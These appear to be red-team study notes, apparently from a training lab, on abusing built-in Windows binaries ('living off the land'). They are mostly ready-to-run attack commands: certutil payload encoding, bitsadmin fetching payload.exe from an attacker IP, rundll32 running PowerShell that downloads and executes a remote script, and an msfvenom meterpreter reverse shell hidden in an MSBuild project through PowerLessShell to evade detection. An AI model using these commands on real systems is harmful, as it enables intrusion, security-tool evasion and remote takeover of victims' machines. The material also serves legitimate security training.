# Live off the land
*   Reconnaissance
*   Files operations
*   Arbitrary code execution
*   Lateral movement
*   Security product bypass

Windows file transfer
---------------------

to transfer a file from windows when you have creds and gui connection, right click on the file/folder and "give access to"→"specific people" and in dropdown select everyone and then ok, this will start a smb server from where you can connect with creds and download files with smbclient.

LOLBAS
------

if we want to look for a specific function, we require providing a  / before the function name. For example, if we are looking for all execute functions, we should use /execute. Similarly, in order to look based on types, we should use the # symbol followed by the type name. The following are the types included in the project:

*   Script
*   Binary
*   Libraries
*   OtherMSBinaries

```text-plain
certutil -encode payload.exe Encoded-payload.txt
```

BITSAdmin
---------

The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the  bitsadmin tool can be found at [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin). Download files with bitsadmin

```text-plain
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

findstr
-------

Download files from smb with findstr:

```text-plain
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe	
```

In order to create a child process of explorer.exe parent, we can execute the following command:

```text-plain
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

WMIC
----

Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/) )

```text-plain
wmic.exe process call create calc   
```

Rundll32
--------

Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage  rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as **Signed Binary Proxy Execution: Rundll32** and refers to it as [T1218](https://attack.mitre.org/techniques/T1218/011/).

```text-plain
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

we used the rundll32.exe binary that embeds a JavaScript component, eval(), to execute the calc.exe binary, a Microsoft calculator.

The following command runs a JavaScript that executes a PowerShell script to download from a remote website using rundll32.exe.

```text-plain
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

PowerLessShell
--------------

PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.

```text-plain
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
```

```text-plain
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

```text-plain
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```

```text-plain
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```

Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell. Note that there will be no powershell.exe process is running.